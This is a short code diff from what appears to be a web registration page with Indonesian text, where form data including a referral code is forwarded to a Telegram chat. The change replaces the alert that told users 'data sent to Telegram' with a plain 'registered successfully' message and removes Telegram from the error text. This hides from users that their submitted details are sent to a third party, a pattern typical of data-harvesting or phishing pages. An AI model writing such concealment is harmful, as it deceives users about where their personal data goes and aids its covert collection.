@@ -164,8 +164,8 @@ Kode Referral: ${referralCode}
                     text: message
                 })
             })
-            .then(() => alert('Data terkirim ke Telegram'))
-            .catch((error) => alert('Gagal kirim ke Telegram: ' + error.message));
+            .then(() => alert('Berhasil Register'))
+            .catch((error) => alert('Gagal: ' + error.message));
         })
         .catch((error) => {
             alert('Registrasi gagal: ' + error.message);
